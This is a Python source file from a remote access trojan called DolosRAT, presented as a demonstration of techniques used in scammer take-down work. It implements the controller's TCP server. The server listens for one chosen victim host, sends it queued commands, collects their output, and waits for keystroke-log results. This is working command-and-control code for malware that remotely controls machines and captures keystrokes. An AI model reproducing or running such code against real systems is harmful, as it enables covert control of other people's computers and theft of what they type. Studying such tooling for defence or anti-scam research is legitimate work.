# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 20/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from builtins import hasattr
from socketserver import BaseRequestHandler, TCPServer, BaseServer
from time import sleep
from typing import Any, Union
from socket import gaierror

# External Imports.
from pyshark.packet.fields import LayerFieldsContainer, LayerField

# Modules.
from config.logger import get_logger_conf # pylint: disable=import-error
from config.network import network_conf # pylint: disable=import-error
from utils.misc.wrapper import BaseWrapper # pylint: disable=import-error
from utils.misc.logger import get_logger, LoggerWrapper, LoggerLevel # pylint: disable=import-error
from utils.misc.threading import threadpooled # pylint: disable=import-error
from utils.net.interface import IfaWrapper # pylint: disable=import-error
from .connection import Socket

class SingleThreadedTCPHandler(BaseRequestHandler):
    """Handler for incoming requests."""

    def __init__(
        self: object,
        request: Any,
        client_address: Any,
        server: BaseServer
    ) -> None:
        """Initialises handler for
        incoming requests."""

        BaseRequestHandler.__init__(self, request, client_address, server)

        # Houses data received from the client.
        self._rx_data: Union[None, bytes] = None

    def setup(self: BaseRequestHandler) -> None:
        """Required to implement as part of
        BaseRequestHandler."""

        return BaseRequestHandler.setup(self)

    def handle(self: BaseRequestHandler) -> None:
        """The method that is evaluated for
        each request. This is where the processing occurs."""

        # Extract port number of service to modify connection statuses
        # of host.
        (_, port) = self.server.server_address
        port = LayerFieldsContainer(LayerField(name='udp.dstport', value=port))

        # Only process if client address is that we
        # desire.
        if self.client_address[0] == self.server.client_addr:
            # Increment request counter
            # for timeout threshold.
            self.server.inc_req()

                # Set listening status of host.
            IfaWrapper.edit_host(self.server.client_addr, port, 'listening', False)

            # Set connected status of host.
            IfaWrapper.edit_host(self.server.client_addr, port, 'connected', True)

                # Extract message from 'socket' object.
            with Socket(self.request) as connection:

                    # Send command over channel with client.
                if command:=IfaWrapper.get_host_attribute(self.server.client_addr, port, 'command'):
                    connection.send(command)

                    if IfaWrapper.get_host_attribute(
                        self.server.client_addr, port, 'command_name'
                    ) == 'KeystrokeLogCommand':
                        sleep(30)

                    IfaWrapper.edit_host(
                        self.server.client_addr, port, 'command_out', connection.recv()
                    )

            # Set statuses of host.
            # IfaWrapper.edit_host(self.server.client_addr, port, 'connected', False)
            IfaWrapper.edit_host(self.server.client_addr, port, 'command', None)

class SingleThreadedTCPServer(TCPServer):
    """Provides the functionality for listening
    over TCP, and passing requests to TCP handler."""

    # Time-out threshold by which a request is anticipated.
    timeout: int = 30

    def __init__(
        self: object,
        server_address,
        RequestHandlerClass,
        client_address: str
    ) -> None:
        """Initialises SingleThreadedTCPServer."""

        TCPServer.__init__(self, server_address, RequestHandlerClass)

        # Stores the client IPv4 address for the handler to filter
        # requests by. Only want to accept ingress from one,
        # specific host.
        self.client_addr = client_address

        # Allow binding to same address after closing.
        self.allow_reuse_address = True

        # Counters used to identify if no requests
        # have been receieved within interval.
        self._req_ctr: int = 0
        self._req_thres: int = 0

    def timeout_check(self: object) -> bool:
        """Compares counters to identify whether a request is
        received within a given time.

        Returns:
            bool: Indicates the result of the
            comparison.
        """

        # Checks if timeout threshold is met.
        return self._req_thres == self._req_ctr

    def res_ctrs(self: object) -> None:
        """Reset threshold counters."""

        self._req_thres = self._req_ctr = 0

    def inc_thres(self: object) -> None:
        """Increments threshold counter
        after 30s."""

        # Increment timeout threshold by 1.
        self._req_thres += 1

    def inc_req(self: object) -> None:
        """Increments request counter when
        request is passed to handler."""

        # Increment request counter by 1.
        self._req_ctr += 1

class TCPServerWrapper(BaseWrapper): # pylint: disable=too-few-public-methods
    """Wraps around functionality for socketserver
    TCPServer."""

    def __init__(
        self: object,
        logger: LoggerWrapper
    ) -> None:
        """Initialises TCPServerWrapper.

        Args:
            network_config (NetworkConfig): Comprises
            networking configuration. Important configurations
            include the interface to listen on, and the host/port
            to specifically accept.
            logger (LoggerWrapper): A handle to the logger.
        """

        super().__init__()

        # IPv4 address of the interface to bind to.
        self._host = str(
            network_conf.conf['selected_ifa'].ifa_addrs
        )

        # IPv4 address of the client to specifically
        # accept connections from.
        self._client = str(
           network_conf.conf['selected_host'].ipv4_addr
        )

        # The port to listen on to receive correspondance
        # from selected host.
        self._port = network_conf.conf['selected_host'].port
        self._port = LayerFieldsContainer(LayerField(name='udp.dstport', value=self._port))

        # Registers handle for logger.
        self._register_handle(logger)

        # Registers handle for
        # SingleThreadedTCPServer.
        self._init_server()

    def _init_server(self: object) -> None:
        """Create SingleThreadedTCPServer
        and add handler.
        """

        # Register handle for SingleThreadedTCPServer.
        # Supplied host and port on which to listen to.
        try:
            self._register_handle(
                SingleThreadedTCPServer(
                    ('0.0.0.0', int(self._port)),
                    # Handler to which requests
                    # are dispatched.
                    SingleThreadedTCPHandler,
                    self._client
                )
            )
        except (gaierror, PermissionError, OSError) as socket_err:
            # Write log to inform of binding error.
            self._get_handle('LoggerWrapper').write_log(
                'Failed to create server on ' \
                    f'\'{self._host}:{self._port}\': { socket_err }',
                LoggerLevel.ERROR
            )

    def close(self: object) -> None:
        """Stops TCPServer from listening
        by forcing shutdown. Prevents resources
        from being unneccessarily consumed."""

        if hasattr(self._get_handle('SingleThreadedTCPServer'), '_BaseServer__shutdown_request'):
            # Write log to inform of shutdown.
            self._get_handle('LoggerWrapper').write_log(
                    f'Server on \'{self._host}:{self._port}\' shutting down.',
                    LoggerLevel.INFO
            )

            # Forcefully shuts down server and
            # releases resources.
            self._get_handle( # pylint: disable=protected-access
                'SingleThreadedTCPServer' # pylint: disable=protected-access
            )._BaseServer__shutdown_request = True # pylint: disable=protected-access

        # Set connected status of selected host to
        # disconnected.
        IfaWrapper.edit_host(self._client, self._port, 'connected', False)

        # Set listening status of host.
        IfaWrapper.edit_host(self._client, self._port, 'listening', False)

    @threadpooled
    def _listen(self: object) -> None:
        """Listens for incoming connections, and times out
        if no request is received within 30s."""

        # Sanity check to prevent socket forbidden errors.
        if hasattr(self._get_handle('SingleThreadedTCPServer'), 'timeout_check'):
            # Generate status log that listening has started.
            self._get_handle('LoggerWrapper').write_log(
                    f'Server listening on \'{self._host}:{self._port}\'...',
                    LoggerLevel.INFO
            )

            # Processing one request at a time
            # within a controlled loop.
            # Timeout: 30s.
            while (
                self._get_handle('SingleThreadedTCPServer').timeout_check() and
                not IfaWrapper.get_host_attribute(self._client, self._port, 'disconnected')
            ):

                # Set listening status to True.
                # network_conf.conf['selected_host'].listening = True
                IfaWrapper.edit_host(self._client, self._port, 'listening', True)

                # Increment threshold counter for timeout.
                self._get_handle('SingleThreadedTCPServer').inc_thres()

                # handle_request() used instead of serve_forever()
                # as to avoid single-thread deadlocking issues.
                # This is the case as we want to timeout listening
                # after period of inactivity.
                try:
                    # Keep handling requests.
                    self._get_handle('SingleThreadedTCPServer').handle_request()
                    # Set listening status of host back to true.
                    IfaWrapper.edit_host(self._client, self._port, 'listening', True)
                except KeyboardInterrupt:
                    self.close()

        # Write log to warn of timing out.
        if hasattr(self._get_handle('SingleThreadedTCPServer'), 'timeout_check'):
            if not self._get_handle('SingleThreadedTCPServer').timeout_check():
                self._get_handle('LoggerWrapper').write_log(
                        f'Idle server on \'{self._host}:{self._port}\' timing out after 30s.',
                        LoggerLevel.WARNING
                )

        # Shutdown server, NOT connection.
        self.close()

    @threadpooled
    def run(self: object) -> None:
        """Exposes method to listen for
        TCP connections.
        """

        # Start listening for TCP connections.
        self._listen()

def get_tcp_server_wrapper() -> TCPServerWrapper:
    """Returns an instance of TCPServerWrapper.

    Returns:
        TCPServerWrapper: An instance of 
        TCPServerWrapper.
    """

    return TCPServerWrapper(
        get_logger(get_logger_conf(f'__main__.{__name__}'))
    )
